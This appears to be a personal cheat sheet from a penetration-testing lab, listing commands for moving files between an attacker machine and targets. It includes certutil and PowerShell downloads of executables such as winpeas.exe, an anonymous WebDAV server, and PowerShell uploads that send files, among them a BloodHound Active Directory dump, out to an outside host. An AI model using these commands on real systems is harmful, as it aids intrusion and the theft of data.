# HFS
```
iwr -uri http://192.168.45.101/hfs.exe -o hfs.exe
```

# wsgidav
```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/oscp_lab/assembling_pieces/beyond/
```
#### mounting shares
```
net use Z: http://192.168.45.159
```

```
curl -T /path/to/local/file http://192.168.45.159/path/on/share/
```

```
curl -T /path/to/local/file http://192.168.45.159/path/on/share/ --user username:password
```

```
$webClient = New-Object System.Net.WebClient
$webClient.UploadFile("http://192.168.45.159/path/on/share/remote_filename", "PUT", "C:\local\file.txt")
```


# iwr 
```
iwr -uri http://ip -o output.exe
```

```
certutil -urlcache -split -f "http://192.168.49.125/winpeas.exe"
```

# SCP
```
scp -P 32826 linpeas.sh student@192.168.211.52:/tmp
```

$webClient = New-Object System.Net.WebClient
$webClient.UploadFile("http://192.168.45.244", "PUT", "C:\Users\web_svc\test_20250720023617_BloodHound.zip")